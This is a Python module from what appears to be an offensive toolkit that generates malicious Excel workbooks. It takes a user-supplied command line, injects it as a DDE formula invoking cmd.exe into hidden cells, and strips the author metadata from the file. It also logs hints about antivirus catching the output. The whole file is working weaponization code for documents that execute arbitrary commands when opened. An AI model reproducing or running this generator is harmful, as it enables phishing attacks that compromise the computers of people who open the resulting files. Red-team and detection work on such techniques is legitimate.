#!/usr/bin/env python
# encoding: utf-8

# Only enabled on windows
import sys
from collections import OrderedDict
if sys.platform == "win32":
    # Download and install pywin32 from https://sourceforge.net/projects/pywin32/files/pywin32/
    import win32com.client # @UnresolvedImport

import logging
import shlex
from modules.excel_gen import ExcelGenerator


class ExcelDDE(ExcelGenerator):
    """ 
    Module used to generate MS ecel file with DDE object attack
    """
         
    
    def run(self):
        logging.info(" [+] Generating MS Excel with DDE document...")
        try:
            
            cmdFile = self.getCMDFile()
            valuesFileContent = ""
            if cmdFile:
                with open(cmdFile, 'r') as f:
                    valuesFileContent = f.read().rstrip()
            
            # Get command line
            paramDict = OrderedDict([("Cmd_Line",None)])      
            self.fillInputParams(paramDict)
            command = paramDict["Cmd_Line"]

            commands = []

            if cmdFile and valuesFileContent:
                command = valuesFileContent
                for l in valuesFileContent.splitlines():
                    if l:
                        commands.append(l)
            else:
                commands.append(command)

                
            logging.info("   [-] Open document...")
            # open up an instance of Excel with the win32com driver\        \\
            excel = win32com.client.Dispatch("Excel.Application")
            # do the operation in background without actually opening Excel
            #excel.Visible = False
            workbook = excel.Workbooks.Open(self.outputFilePath)
            workbook.UpdateRemoteReferences = False
    
            logging.info("   [-] Inject DDE field...")

            ddeCmds = []
            for command in commands:
                ddeCmd = ""
                if command[1] == ":" or command[2] == ":": # command's is an image absolute path, possibly quoted
                    commandBeginning, commandEnd = command[:4], command[4:]
                    commandBeginning = commandBeginning.replace("c:\\", "\\..\\..\\").replace("C:\\", "\\..\\..\\")
                    command = commandBeginning + commandEnd
                    ddeCmd = "=MSEXCEL|'%s'!A1" % command.rstrip()
                else:
                    logging.info("   [-] Using cmd.exe to execute the desired command")
                    ddeCmd = r"""=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c %s'!A1""" % command.rstrip()
                ddeCmds.append(ddeCmd)

            colNum = 26
            for ddeCmd in ddeCmds:
                excel.Cells(1, colNum).Formula = ddeCmd
                excel.Cells(1, colNum).FormulaHidden = True
                logging.info("   [-] The DDE being used is: %s" %excel.Cells(1, colNum).Formula)
                colNum += 1
            
            # Remove Informations
            logging.info("   [-] Remove hidden data and personal info...")
            xlRDIAll=99
            workbook.RemoveDocumentInformation(xlRDIAll)
            logging.info("   [-] Save Document...")
            excel.DisplayAlerts=False
            excel.Workbooks(1).Close(SaveChanges=1)
            excel.Application.Quit()
            # garbage collection
            del excel
            logging.info("   [-] Generated %s file path: %s" % (self.outputFileType, self.outputFilePath))
         
        except Exception:
            logging.exception(" [!] Exception caught!")
            logging.error(" [!] Hints: Check if MS office is really closed and Antivirus did not catch the files")
            logging.error(" [!] Attempt to force close MS Excel applications...")
            objExcel = win32com.client.Dispatch("Excel.Application")
            objExcel.Application.Quit()
            del objExcel

        
